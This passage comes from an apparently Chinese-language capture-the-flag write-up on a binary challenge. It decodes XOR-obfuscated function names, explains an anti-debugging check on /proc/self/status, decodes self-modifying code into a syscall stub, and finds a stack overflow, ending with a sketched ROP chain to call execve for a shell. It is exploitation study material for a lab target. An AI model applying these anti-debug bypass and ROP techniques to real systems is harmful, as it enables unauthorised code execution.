class="number">79</span>;</span><br><span class="line">  fgets_str[<span class="number">4</span>] = <span class="number">72</span>;</span><br><span class="line">  v26 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt;= <span class="number">4</span>; ++n )</span><br><span class="line">    fgets_str[n] ^= <span class="number">0x3B</span>u;</span><br><span class="line">  fgets_ = (__int64 (__fastcall *)(<span class="keyword">char</span> *, <span class="keyword">signed</span> __int64, __int64))CallLibFunc((<span class="keyword">void</span> **)a1, fgets_str);</span><br><span class="line">  strstr_str[<span class="number">0</span>] = <span class="number">60</span>;</span><br><span class="line">  strstr_str[<span class="number">1</span>] = <span class="number">59</span>;</span><br><span class="line">  strstr_str[<span class="number">2</span>] = <span class="number">61</span>;</span><br><span class="line">  strstr_str[<span class="number">3</span>] = <span class="number">60</span>;</span><br><span class="line">  strstr_str[<span class="number">4</span>] = <span class="number">59</span>;</span><br><span class="line">  strstr_str[<span class="number">5</span>] = <span class="number">61</span>;</span><br><span class="line">  v30 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( ii = <span class="number">0</span>; ii &lt;= <span class="number">5</span>; ++ii )</span><br><span class="line">    strstr_str[ii] ^= <span class="number">0x4F</span>u;</span><br><span class="line">  strstr_ = (__int64 (__fastcall *)(<span class="keyword">char</span> *, <span class="keyword">char</span> *))CallLibFunc((<span class="keyword">void</span> **)a1, strstr_str);</span><br><span class="line">  atoi_str[<span class="number">0</span>] = <span class="number">57</span>;</span><br><span class="line">  atoi_str[<span class="number">1</span>] = <span class="number">44</span>;</span><br><span class="line">  atoi_str[<span class="number">2</span>] = <span class="number">55</span>;</span><br><span class="line">  atoi_str[<span class="number">3</span>] = <span class="number">49</span>;</span><br><span class="line">  v22 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( jj = <span class="number">0</span>; jj &lt;= <span class="number">3</span>; ++jj )</span><br><span class="line">    atoi_str[jj] ^= <span class="number">0x58</span>u;</span><br><span class="line">  atoi_ = (__int64 (__fastcall *)(_BYTE *))CallLibFunc((<span class="keyword">void</span> **)a1, atoi_str);</span><br><span class="line">  <span class="keyword">while</span> ( fgets_(&amp;proc_status_str, <span class="number">48L</span>L, fp) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( strstr_(&amp;proc_status_str, trace_pid) != <span class="number">0</span> )</span><br><span class="line">      v8 = atoi_(v40);</span><br><span class="line">  &#125;</span><br><span class="line">  fclose_str[<span class="number">0</span>] = <span class="number">4</span>;</span><br><span class="line">  fclose_str[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">  fclose_str[<span class="number">2</span>] = <span class="number">14</span>;</span><br><span class="line">  fclose_str[<span class="number">3</span>] = <span class="number">13</span>;</span><br><span class="line">  fclose_str[<span class="number">4</span>] = <span class="number">17</span>;</span><br><span class="line">  fclose_str[<span class="number">5</span>] = <span class="number">7</span>;</span><br><span class="line">  v32 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( kk = <span class="number">0</span>; kk &lt;= <span class="number">5</span>; ++kk )</span><br><span class="line">    fclose_str[kk] ^= <span class="number">0x62</span>u;</span><br><span class="line">  fclose_ = (<span class="keyword">void</span> (__fastcall *)(__int64, <span class="keyword">char</span> *))CallLibFunc((<span class="keyword">void</span> **)a1, fclose_str);</span><br><span class="line">  fclose_(fp, fclose_str);</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解码脚本如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">char</span> file[<span class="number">9</span>];</span><br><span class="line">  file[<span class="number">0</span>] = <span class="number">91</span>;</span><br><span class="line">  file[<span class="number">1</span>] = <span class="number">94</span>;</span><br><span class="line">  file[<span class="number">2</span>] = <span class="number">85</span>;</span><br><span class="line">  file[<span class="number">3</span>] = <span class="number">84</span>;</span><br><span class="line">  file[<span class="number">4</span>] = <span class="number">25</span>;</span><br><span class="line">  file[<span class="number">5</span>] = <span class="number">68</span>;</span><br><span class="line">  file[<span class="number">6</span>] = <span class="number">88</span>;</span><br><span class="line">  file[<span class="number">7</span>] = <span class="number">25</span>;</span><br><span class="line">  file[<span class="number">8</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">char</span> buf8[<span class="number">4</span>]; <span class="comment">// [rsp+80h] [rbp-D0h]</span></span><br><span class="line">  <span class="keyword">char</span> buf5[<span class="number">5</span>]; <span class="comment">// [rsp+90h] [rbp-C0h]</span></span><br><span class="line">  <span class="keyword">char</span> buf6[<span class="number">5</span>]; <span class="comment">// [rsp+A0h] [rbp-B0h]</span></span><br><span class="line">  <span class="keyword">char</span> buf4[<span class="number">6</span>]; <span class="comment">// [rsp+B0h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">char</span> buf7[<span class="number">6</span>]; <span class="comment">// [rsp+C0h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">char</span> buf9[<span class="number">6</span>]; <span class="comment">// [rsp+D0h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> buf3[<span class="number">8</span>]; <span class="comment">// [rsp+E0h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> buf2[<span class="number">9</span>]; <span class="comment">// [rsp+F0h] [rbp-60h]</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">char</span> buf1[<span class="number">15</span>]; <span class="comment">// [rsp+100h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> hh[<span class="number">23</span>];</span><br><span class="line">  <span class="keyword">char</span> wz[<span class="number">23</span>] = &#123;<span class="number">0x89</span>, <span class="number">0x7D</span>, <span class="number">0xFC</span>, <span class="number">0x89</span> ,<span class="number">0x75</span> ,<span class="number">0xF8</span> ,<span class="number">0x89</span> ,<span class="number">0x55</span> ,<span class="number">0xF4</span> ,<span class="number">0x89</span> ,<span class="number">0x4D</span> ,<span class="number">0xF0</span> ,<span class="number">0x44</span> ,<span class="number">0x89</span> ,<span class="number">0x45</span> ,<span class="number">0xEC</span> ,<span class="number">0x8B</span> ,<span class="number">0x45</span> ,<span class="number">0xF8</span> ,<span class="number">0x99</span> ,<span class="number">0xF7</span>,<span class="number">0x7D</span> , <span class="number">0xF4</span>&#125;;</span><br><span class="line">  <span class="keyword">char</span> res[<span class="number">23</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  hh[<span class="number">0</span>] = <span class="number">-63</span>;</span><br><span class="line">  hh[<span class="number">1</span>] = <span class="number">-12</span>;</span><br><span class="line">  hh[<span class="number">2</span>] = <span class="number">4</span>;</span><br><span class="line">  hh[<span class="number">3</span>] = <span class="number">-63</span>;</span><br><span class="line">  hh[<span class="number">4</span>] = <span class="number">-4</span>;</span><br><span class="line">  hh[<span class="number">5</span>] = <span class="number">15</span>;</span><br><span class="line">  hh[<span class="number">6</span>] = <span class="number">-63</span>;</span><br><span class="line">  hh[<span class="number">7</span>] = <span class="number">-36</span>;</span><br><span class="line">  hh[<span class="number">8</span>] = <span class="number">34</span>;</span><br><span class="line">  hh[<span class="number">9</span>] = <span class="number">-63</span>;</span><br><span class="line">  hh[<span class="number">10</span>] = <span class="number">-60</span>;</span><br><span class="line">  hh[<span class="number">11</span>] = <span class="number">58</span>;</span><br><span class="line">  hh[<span class="number">12</span>] = <span class="number">8</span>;</span><br><span class="line">  hh[<span class="number">13</span>] = <span class="number">0</span>;</span><br><span class="line">  hh[<span class="number">14</span>] = <span class="number">-124</span>;</span><br><span class="line">  hh[<span class="number">15</span>] = <span class="number">-29</span>;</span><br><span class="line">  hh[<span class="number">16</span>] = <span class="number">-114</span>;</span><br><span class="line">  hh[<span class="number">17</span>] = <span class="number">-116</span>;</span><br><span class="line">  hh[<span class="number">18</span>] = <span class="number">59</span>;</span><br><span class="line">  hh[<span class="number">19</span>] = <span class="number">-47</span>;</span><br><span class="line">  hh[<span class="number">20</span>] = <span class="number">-58</span>;</span><br><span class="line">  hh[<span class="number">21</span>] = <span class="number">-76</span>;</span><br><span class="line">  hh[<span class="number">22</span>] = <span class="number">55</span>;</span><br><span class="line"></span><br><span class="line">  buf1[<span class="number">0</span>] = <span class="number">52</span>;</span><br><span class="line">  buf1[<span class="number">1</span>] = <span class="number">107</span>;</span><br><span class="line">  buf1[<span class="number">2</span>] = <span class="number">105</span>;</span><br><span class="line">  buf1[<span class="number">3</span>] = <span class="number">116</span>;</span><br><span class="line">  buf1[<span class="number">4</span>] = <span class="number">120</span>;</span><br><span class="line">  buf1[<span class="number">5</span>] = <span class="number">52</span>;</span><br><span class="line">  buf1[<span class="number">6</span>] = <span class="number">62</span>;</span><br><span class="line">  buf1[<span class="number">7</span>] = <span class="number">127</span>;</span><br><span class="line">  buf1[<span class="number">8</span>] = <span class="number">52</span>;</span><br><span class="line">  buf1[<span class="number">9</span>] = <span class="number">104</span>;</span><br><span class="line">  buf1[<span class="number">10</span>] = <span class="number">111</span>;</span><br><span class="line">  buf1[<span class="number">11</span>] = <span class="number">122</span>;</span><br><span class="line">  buf1[<span class="number">12</span>] = <span class="number">111</span>;</span><br><span class="line">  buf1[<span class="number">13</span>] = <span class="number">110</span>;</span><br><span class="line">  buf1[<span class="number">14</span>] = <span class="number">104</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">14</span>; ++i )</span><br><span class="line">    buf1[i] ^= <span class="number">0x1B</span>u;</span><br><span class="line">  buf2[<span class="number">0</span>] = <span class="number">117</span>;</span><br><span class="line">  buf2[<span class="number">1</span>] = <span class="number">83</span>;</span><br><span class="line">  buf2[<span class="number">2</span>] = <span class="number">64</span>;</span><br><span class="line">  buf2[<span class="number">3</span>] = <span class="number">66</span>;</span><br><span class="line">  buf2[<span class="number">4</span>] = <span class="number">68</span>;</span><br><span class="line">  buf2[<span class="number">5</span>] = <span class="number">83</span>;</span><br><span class="line">  buf2[<span class="number">6</span>] = <span class="number">113</span>;</span><br><span class="line">  buf2[<span class="number">7</span>] = <span class="number">72</span>;</span><br><span class="line">  buf2[<span class="number">8</span>] = <span class="number">69</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= <span class="number">8</span>; ++j )</span><br><span class="line">    buf2[j] ^= <span class="number">0x21</span>u;</span><br><span class="line">  buf3[<span class="number">0</span>] = <span class="number">94</span>;</span><br><span class="line">  buf3[<span class="number">1</span>] = <span class="number">67</span>;</span><br><span class="line">  buf3[<span class="number">2</span>] = <span class="number">93</span>;</span><br><span class="line">  buf3[<span class="number">3</span>] = <span class="number">95</span>;</span><br><span class="line">  buf3[<span class="number">4</span>] = <span class="number">68</span>;</span><br><span class="line">  buf3[<span class="number">5</span>] = <span class="number">67</span>;</span><br><span class="line">  buf3[<span class="number">6</span>] = <span class="number">89</span>;</span><br><span class="line">  buf3[<span class="number">7</span>] = <span class="number">75</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt;= <span class="number">7</span>; ++k )</span><br><span class="line">    buf3[k] ^= <span class="number">0x2D</span>u;</span><br><span class="line">  buf4[<span class="number">0</span>] = <span class="number">81</span>;</span><br><span class="line">  buf4[<span class="number">1</span>] = <span class="number">83</span>;</span><br><span class="line">  buf4[<span class="number">2</span>] = <span class="number">66</span>;</span><br><span class="line">  buf4[<span class="number">3</span>] = <span class="number">70</span>;</span><br><span class="line">  buf4[<span class="number">4</span>] = <span class="number">95</span>;</span><br><span class="line">  buf4[<span class="number">5</span>] = <span class="number">82</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> l = <span class="number">0</span>; l &lt;= <span class="number">5</span>; ++l )</span><br><span class="line">    buf4[l] ^= <span class="number">0x36</span>u;</span><br><span class="line">  buf5[<span class="number">0</span>] = <span class="number">36</span>;</span><br><span class="line">  buf5[<span class="number">1</span>] = <span class="number">45</span>;</span><br><span class="line">  buf5[<span class="number">2</span>] = <span class="number">50</span>;</span><br><span class="line">  buf5[<span class="number">3</span>] = <span class="number">39</span>;</span><br><span class="line">  buf5[<span class="number">4</span>] = <span class="number">44</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> m = <span class="number">0</span>; m &lt;= <span class="number">4</span>; ++m )</span><br><span class="line">    buf5[m] ^= <span class="number">0x42</span>u;</span><br><span class="line">  buf6[<span class="number">0</span>] = <span class="number">93</span>;</span><br><span class="line">  buf6[<span class="number">1</span>] = <span class="number">92</span>;</span><br><span class="line">  buf6[<span class="number">2</span>] = <span class="number">94</span>;</span><br><span class="line">  buf6[<span class="number">3</span>] = <span class="number">79</span>;</span><br><span class="line">  buf6[<span class="number">4</span>] = <span class="number">72</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> n = <span class="number">0</span>; n &lt;= <span class="number">4</span>; ++n )</span><br><span class="line">    buf6[n] ^= <span class="number">0x3B</span>u;</span><br><span class="line">  buf7[<span class="number">0</span>] = <span class="number">60</span>;</span><br><span class="line">  buf7[<span class="number">1</span>] = <span class="number">59</span>;</span><br><span class="line">  buf7[<span class="number">2</span>] = <span class="number">61</span>;</span><br><span class="line">  buf7[<span class="number">3</span>] = <span class="number">60</span>;</span><br><span class="line">  buf7[<span class="number">4</span>] = <span class="number">59</span>;</span><br><span class="line">  buf7[<span class="number">5</span>] = <span class="number">61</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> ii = <span class="number">0</span>; ii &lt;= <span class="number">5</span>; ++ii )</span><br><span class="line">    buf7[ii] ^= <span class="number">0x4F</span>u;</span><br><span class="line">  buf8[<span class="number">0</span>] = <span class="number">57</span>;</span><br><span class="line">  buf8[<span class="number">1</span>] = <span class="number">44</span>;</span><br><span class="line">  buf8[<span class="number">2</span>] = <span class="number">55</span>;</span><br><span class="line">  buf8[<span class="number">3</span>] = <span class="number">49</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> jj = <span class="number">0</span>; jj &lt;= <span class="number">3</span>; ++jj )</span><br><span class="line">    buf8[jj] ^= <span class="number">0x58</span>u;</span><br><span class="line">  buf9[<span class="number">0</span>] = <span class="number">4</span>;</span><br><span class="line">  buf9[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">  buf9[<span class="number">2</span>] = <span class="number">14</span>;</span><br><span class="line">  buf9[<span class="number">3</span>] = <span class="number">13</span>;</span><br><span class="line">  buf9[<span class="number">4</span>] = <span class="number">17</span>;</span><br><span class="line">  buf9[<span class="number">5</span>] = <span class="number">7</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> kk = <span class="number">0</span>; kk &lt;= <span class="number">5</span>; ++kk )</span><br><span class="line">    buf9[kk] ^= <span class="number">0x62</span>u;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">8</span>; ++i )</span><br><span class="line">    file[i] ^= <span class="number">0x37</span>u;</span><br><span class="line">  <span class="keyword">char</span> what[<span class="number">8</span>];</span><br><span class="line">  what[<span class="number">0</span>] = <span class="number">113</span>;</span><br><span class="line">  what[<span class="number">1</span>] = <span class="number">108</span>;</span><br><span class="line">  what[<span class="number">2</span>] = <span class="number">110</span>;</span><br><span class="line">  what[<span class="number">3</span>] = <span class="number">115</span>;</span><br><span class="line">  what[<span class="number">4</span>] = <span class="number">104</span>;</span><br><span class="line">  what[<span class="number">5</span>] = <span class="number">121</span>;</span><br><span class="line">  what[<span class="number">6</span>] = <span class="number">127</span>;</span><br><span class="line">  what[<span class="number">7</span>] = <span class="number">104</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    what[i] ^= <span class="number">0x1C</span>u;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> xx = <span class="number">0</span>; xx &lt;= <span class="number">22</span>; ++xx)&#123;</span><br><span class="line">	res[xx]  = wz[xx] ^ hh[xx];</span><br><span class="line">    <span class="comment">//printf("%p, ",res[xx] &amp; 0xff);</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"file:%s\n"</span>,file);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"buf1:%s\n"</span>,buf1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"buf2:%s\n"</span>,buf2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"buf3:%s\n"</span>,buf3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"buf4:%s\n"</span>,buf4);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"buf5:%s\n"</span>,buf5);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"buf6:%s\n"</span>,buf6);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"buf7:%s\n"</span>,buf7);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"buf8:%s\n"</span>,buf8);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"buf9:%s\n"</span>,buf9);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"what:%s\n"</span>,what);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当进程被调试时，其会在/proc/self/status里增加一个调试进程的pid，赋给TracePid，该函数在这个文件中查找该字段，如果发现就将pid返回给上层函数，否则返回0.</p>
<p><img src="/2020/12/19/xihulunjian/2.png" alt></p>
<p>继续看，如果没有调试器，result为1，则调用AutoChange函数。</p>
<p>首先调用mprotect将代码段加上可执行权限，之后使用异或的方式循环修改位于<code>0x4017CD</code>的汇编代码，我们还是写个c来解码(这部分在上面的test.c里)，之后把修改的字节码反汇编一下。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">AutoChange</span><span class="params">(<span class="keyword">void</span> **a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+14h] [rbp-3Ch]</span></span><br><span class="line">  <span class="keyword">void</span> (__fastcall *mprotect_)(_QWORD, <span class="keyword">signed</span> __int64, <span class="keyword">signed</span> __int64); <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> what[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> hh[<span class="number">23</span>]; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  hh[<span class="number">0</span>] = <span class="number">-63</span>;</span><br><span class="line">  hh[<span class="number">1</span>] = <span class="number">-12</span>;</span><br><span class="line">  hh[<span class="number">2</span>] = <span class="number">4</span>;</span><br><span class="line">  hh[<span class="number">3</span>] = <span class="number">-63</span>;</span><br><span class="line">  hh[<span class="number">4</span>] = <span class="number">-4</span>;</span><br><span class="line">  hh[<span class="number">5</span>] = <span class="number">15</span>;</span><br><span class="line">  hh[<span class="number">6</span>] = <span class="number">-63</span>;</span><br><span class="line">  hh[<span class="number">7</span>] = <span class="number">-36</span>;</span><br><span class="line">  hh[<span class="number">8</span>] = <span class="number">34</span>;</span><br><span class="line">  hh[<span class="number">9</span>] = <span class="number">-63</span>;</span><br><span class="line">  hh[<span class="number">10</span>] = <span class="number">-60</span>;</span><br><span class="line">  hh[<span class="number">11</span>] = <span class="number">58</span>;</span><br><span class="line">  hh[<span class="number">12</span>] = <span class="number">8</span>;</span><br><span class="line">  hh[<span class="number">13</span>] = <span class="number">0</span>;</span><br><span class="line">  hh[<span class="number">14</span>] = <span class="number">-124</span>;</span><br><span class="line">  hh[<span class="number">15</span>] = <span class="number">-29</span>;</span><br><span class="line">  hh[<span class="number">16</span>] = <span class="number">-114</span>;</span><br><span class="line">  hh[<span class="number">17</span>] = <span class="number">-116</span>;</span><br><span class="line">  hh[<span class="number">18</span>] = <span class="number">59</span>;</span><br><span class="line">  hh[<span class="number">19</span>] = <span class="number">-47</span>;</span><br><span class="line">  hh[<span class="number">20</span>] = <span class="number">-58</span>;</span><br><span class="line">  hh[<span class="number">21</span>] = <span class="number">-76</span>;</span><br><span class="line">  hh[<span class="number">22</span>] = <span class="number">55</span>;</span><br><span class="line">  what[<span class="number">0</span>] = <span class="number">113</span>;</span><br><span class="line">  what[<span class="number">1</span>] = <span class="number">108</span>;</span><br><span class="line">  what[<span class="number">2</span>] = <span class="number">110</span>;</span><br><span class="line">  what[<span class="number">3</span>] = <span class="number">115</span>;</span><br><span class="line">  what[<span class="number">4</span>] = <span class="number">104</span>;</span><br><span class="line">  what[<span class="number">5</span>] = <span class="number">121</span>;</span><br><span class="line">  what[<span class="number">6</span>] = <span class="number">127</span>;</span><br><span class="line">  what[<span class="number">7</span>] = <span class="number">104</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    what[i] ^= <span class="number">0x1C</span>u;</span><br><span class="line">  mprotect_ = (<span class="keyword">void</span> (__fastcall *)(_QWORD, <span class="keyword">signed</span> __int64, <span class="keyword">signed</span> __int64))CallLibFunc(a1, what);</span><br><span class="line">  mprotect_((<span class="keyword">unsigned</span> <span class="keyword">int</span>)Syscall &amp; <span class="number">0xFFFFF000</span>, <span class="number">4096L</span>L, <span class="number">7L</span>L);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">22</span>; ++j )</span><br><span class="line">    *((_BYTE *)Syscall + j + <span class="number">4</span>) = *((_BYTE *)&amp;wz + j) ^ hh[j];</span><br><span class="line">  mprotect_((<span class="keyword">unsigned</span> <span class="keyword">int</span>)Syscall &amp; <span class="number">0xFFFFF000</span>, <span class="number">4096L</span>L, <span class="number">5L</span>L);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>反汇编脚本<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">context.os=<span class="string">'linux'</span></span><br><span class="line"></span><br><span class="line">c = [<span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xf8</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xf7</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xd6</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xca</span>, <span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0xc1</span>, <span class="number">0xf</span>, <span class="number">0x5</span>, <span class="number">0xc9</span>, <span class="number">0xc3</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0xc3</span>]</span><br><span class="line"></span><br><span class="line">code = <span class="string">''</span>.join(chr(item) <span class="keyword">for</span> item <span class="keyword">in</span> c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> disasm(code)</span><br></pre></td></tr></table></figure></p>
<p>最终可以得到这部分修改的汇编，即修改为了syscall函数。我们使用Keypatch将这部分汇编patch过去，并且nop掉AutoChange函数。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">╭─wz@wz-virtual-machine ~/Desktop/CTF/kctf_q3 ‹hexo*› </span><br><span class="line">╰─$ python test.py </span><br><span class="line">   0:   48 89 f8                mov    rax,rdi</span><br><span class="line">   3:   48 89 f7                mov    rdi,rsi</span><br><span class="line">   6:   48 89 d6                mov    rsi,rdx</span><br><span class="line">   9:   48 89 ca                mov    rdx,rcx</span><br><span class="line">   c:   4c 89 c1                mov    rcx,r8</span><br><span class="line">   f:   0f 05                   syscall </span><br><span class="line">  11:   c9                      leave  </span><br><span class="line">  12:   c3                      ret    </span><br><span class="line">  13:   48 31 c9                xor    rcx,rcx</span><br><span class="line">  16:   c3                      ret</span><br></pre></td></tr></table></figure>
<p>patch之后的位置成了一个新的函数.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">Syscall</span><span class="params">(__int64 num, <span class="keyword">int</span> arg1, <span class="keyword">int</span> arg2, <span class="keyword">int</span> arg3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = num;</span><br><span class="line">  __asm &#123; syscall; Keypatch modified <span class="keyword">this</span> from: &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>到了这里我们再重新看main函数。input函数向bss段写入了0x200的字节</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">get_input</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> read_num; <span class="comment">// edx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)a1 = off_401898;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">  read_num = Syscall(<span class="number">0L</span>L, <span class="number">0</span>, (<span class="keyword">unsigned</span> __int64)&amp;bss_input, <span class="number">0x200</span>);</span><br><span class="line">  result = a1;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">8</span>) = read_num;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Mov函数将输入数据拷贝到栈上，这里存在栈溢出，且调用位于stack_val+0x18的函数指针。<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">Mov</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *stack_val, __int64 input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v3, <span class="number">0</span>, <span class="number">0x60</span>uLL);</span><br><span class="line">  sub_40177E((__int64)stack_val, (__int64)&amp;v3, input);</span><br><span class="line">  (*(<span class="keyword">void</span> (__fastcall **)(<span class="keyword">unsigned</span> <span class="keyword">int</span> *, <span class="keyword">char</span> *))(*(_QWORD *)stack_val + <span class="number">0x18</span>LL))(stack_val, &amp;v3);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">my_copy</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+28h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(a1 + <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)result &lt;= i )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(a2 + i) = *(_BYTE *)(i + a3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里我们只能通过系统调用执行Sys_execve。需要控制rdi,rsi,rdx,rax。通过csu可以控制edi,rsi,rdx，结合syscall的mov可以间接控制rax,rdi,rsi,再加上<code>xor rcx,rcx; ret</code> + <code>mov    rdx,rcx</code>就可以控制rdx最后执行系统调用get shell。</p>
